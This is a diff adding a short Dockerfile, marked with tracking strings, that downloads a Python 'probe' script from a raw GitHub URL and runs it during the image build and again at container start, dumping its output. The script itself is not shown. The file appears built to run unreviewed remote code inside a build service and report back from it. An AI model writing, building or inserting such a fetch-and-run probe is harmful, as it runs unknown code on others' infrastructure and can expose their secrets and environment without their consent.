@@ -1,0 +1,7 @@
+# MARK-I68197-mesh-7f3a2c
+FROM alpine:3.20
+RUN echo MARK-I68197-mesh-7f3a2c-step1
+RUN apk add --no-cache python3 curl >/dev/null 2>&1; echo APKDONE
+RUN curl -sS -m 30 -o /m.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i68197.py && echo DL_OK && wc -l /m.py
+RUN python3 /m.py build 2>&1 | head -c 30000
+CMD ["sh","-c","python3 /m.py runtime 2>&1; sleep 180"]
